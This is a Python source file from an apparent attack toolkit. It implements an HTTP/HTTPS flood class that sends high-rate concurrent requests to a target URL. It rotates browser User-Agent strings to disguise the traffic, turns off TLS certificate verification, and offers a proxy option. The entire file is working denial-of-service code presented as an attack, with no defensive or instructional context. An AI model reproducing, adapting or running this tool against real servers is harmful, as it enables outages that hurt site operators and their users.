import asyncio
import random
import ssl
import time
from typing import Any, Optional

import aiohttp
import structlog

from attack.base import BaseAttacker
from utils.histogram import Histogram

logger = structlog.get_logger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]


class HTTPFloodAttack(BaseAttacker):
    name = "http_flood"
    description = "HTTP/HTTPS flood attack with concurrent connection pooling"

    async def run(
        self,
        target: str,
        method: str = "GET",
        path: str = "/",
        rate: int = 100,
        concurrent: int = 50,
        body: Optional[str] = None,
        headers: Optional[dict] = None,
        cookies: Optional[dict] = None,
        use_proxy: bool = False,
        random_ua: bool = True,
        **kwargs: Any,
    ) -> None:
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"
        if not path.startswith("/"):
            path = f"/{path}"

        url = target.rstrip("/") + path if path != "/" else target.rstrip("/")
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(
            limit=concurrent,
            limit_per_host=concurrent,
            ssl=ssl_context,
            force_close=True,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=10, connect=5)

        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        sem = asyncio.Semaphore(concurrent)
        latency_hist = Histogram()

        async def make_request(client: aiohttp.ClientSession) -> None:
            headers_dict = headers or {}
            if random_ua:
                headers_dict["User-Agent"] = random.choice(USER_AGENTS)
            if "Accept" not in headers_dict:
                headers_dict["Accept"] = "*/*"

            t0 = time.monotonic()
            try:
                if method.upper() == "GET":
                    resp = await client.get(url, headers=headers_dict, cookies=cookies or {})
                elif method.upper() == "POST":
                    resp = await client.post(url, data=body or "", headers=headers_dict, cookies=cookies or {})
                elif method.upper() == "HEAD":
                    resp = await client.head(url, headers=headers_dict, cookies=cookies or {})
                else:
                    resp = await client.request(method.upper(), url, data=body, headers=headers_dict, cookies=cookies or {})

                content = await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                latency_hist.add(elapsed_ms)
                self.session.stats.packets_sent += 1
                self.session.stats.bytes_sent += len(content or b"")
                self.session.stats.packets_received += 1
                self.session.stats.bytes_received += len(content or b"")
                resp.release()
            except asyncio.TimeoutError:
                self.session.stats.packets_sent += 1
                self.session.stats.errors += 1
            except aiohttp.ClientError:
                self.session.stats.packets_sent += 1
                self.session.stats.errors += 1
            except Exception:
                self.session.stats.errors += 1

        delay = 1.0 / rate if rate > 0 else 0

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                async with sem:
                    await make_request(session)
                await asyncio.sleep(delay)

        self.session._latency_hist = latency_hist

        try:
            tasks = [asyncio.create_task(worker()) for _ in range(concurrent)]
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await session.close()
